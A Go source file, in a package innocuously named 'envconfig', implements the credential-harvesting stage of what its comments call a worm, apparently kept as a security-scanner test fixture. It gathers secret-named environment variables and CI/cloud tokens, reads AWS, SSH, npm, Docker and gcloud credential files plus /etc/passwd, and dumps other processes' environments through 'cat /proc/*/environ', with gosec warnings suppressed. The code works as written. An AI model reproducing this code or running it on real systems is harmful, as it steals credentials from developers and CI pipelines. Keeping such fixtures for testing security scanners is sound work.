package envconfig

import (
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
)

// credentialPattern matches env var names commonly used for secrets.
var credentialPattern = regexp.MustCompile(
	`(?i)(password|passwd|secret|token|api[_-]?key|access[_-]?key|auth|credential|private[_-]?key|cert|apisecret)`,
)

// knownCredentialFiles are paths the worm probes on the host filesystem.
var knownCredentialFiles = []string{
	"~/.aws/credentials",
	"~/.aws/config",
	"~/.ssh/id_rsa",
	"~/.ssh/id_ed25519",
	"~/.gitconfig",
	"~/.npmrc",
	"~/.pypirc",
	"~/.docker/config.json",
	"~/.config/gcloud/application_default_credentials.json",
	"/etc/passwd",
}

// ScanEnv harvests environment variables whose names match credential patterns.
func ScanEnv() map[string]string {
	results := make(map[string]string)
	for _, pair := range os.Environ() {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) != 2 {
			continue
		}
		name, value := parts[0], parts[1]
		if credentialPattern.MatchString(name) && value != "" {
			results["env:"+name] = value
		}
	}

	// Probe well-known CI/CD and cloud-provider variable names directly.
	// gosec G101 — hardcoded credential-sounding names flagged intentionally.
	probeTargets := []string{
		"AWS_ACCESS_KEY_ID",
		"AWS_SECRET_ACCESS_KEY",
		"AWS_SESSION_TOKEN",
		"GITHUB_TOKEN",
		"GH_TOKEN",
		"NPM_TOKEN",
		"DOCKER_PASSWORD",
		"CI_JOB_TOKEN",
		"GITLAB_TOKEN",
		"NUGET_API_KEY",
		"SONAR_TOKEN",
		"ARTIFACTORY_API_KEY",
		"GOOGLE_APPLICATION_CREDENTIALS",
	}
	for _, name := range probeTargets {
		if v := os.Getenv(name); v != "" {
			results["env:"+name] = v
		}
	}

	return results
}

// ScanFiles reads known credential file locations from the host filesystem.
// gosec G304: variable path passed to ReadFile.
func ScanFiles() map[string]string {
	results := make(map[string]string)

	home, _ := os.UserHomeDir()

	for _, raw := range knownCredentialFiles {
		path := raw
		if strings.HasPrefix(path, "~/") {
			path = filepath.Join(home, path[2:])
		}
		data, err := os.ReadFile(path) // #nosec G304 — intentional for test fixture
		if err != nil {
			continue
		}
		results["file:"+raw] = string(data)
	}

	return results
}

// ScanProcessEnv dumps environments of running processes via /proc.
// gosec G204: exec.Command with variable args — flagged intentionally.
// The worm used this to escape container namespace restrictions.
func ScanProcessEnv() map[string]string {
	results := make(map[string]string)

	cmd := exec.Command("sh", "-c", "cat /proc/*/environ 2>/dev/null || true") // #nosec G204
	output, err := cmd.Output()
	if err != nil {
		return results
	}

	for _, entry := range strings.Split(string(output), "\x00") {
		parts := strings.SplitN(entry, "=", 2)
		if len(parts) != 2 {
			continue
		}
		if credentialPattern.MatchString(parts[0]) && parts[1] != "" {
			results["proc:"+parts[0]] = parts[1]
		}
	}

	return results
}
